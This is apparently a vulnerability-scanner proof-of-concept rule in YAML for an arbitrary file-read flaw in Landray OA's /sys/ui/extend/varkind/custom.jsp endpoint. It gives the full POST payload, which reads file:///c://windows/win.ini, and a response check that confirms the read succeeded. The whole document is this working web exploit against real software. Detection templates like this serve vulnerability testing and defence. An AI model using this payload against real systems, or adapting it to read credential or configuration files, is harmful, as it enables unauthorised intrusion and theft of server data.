name: poc-yaml-landray-oa-custom-jsp-fileread
rules:
  - method: POST
    path: /sys/ui/extend/varkind/custom.jsp
    body: var={"body":{"file":"file:///c://windows/win.ini"}}
    expression: |
      response.status == 200 && response.body.bcontains(b"for 16-bit app support")
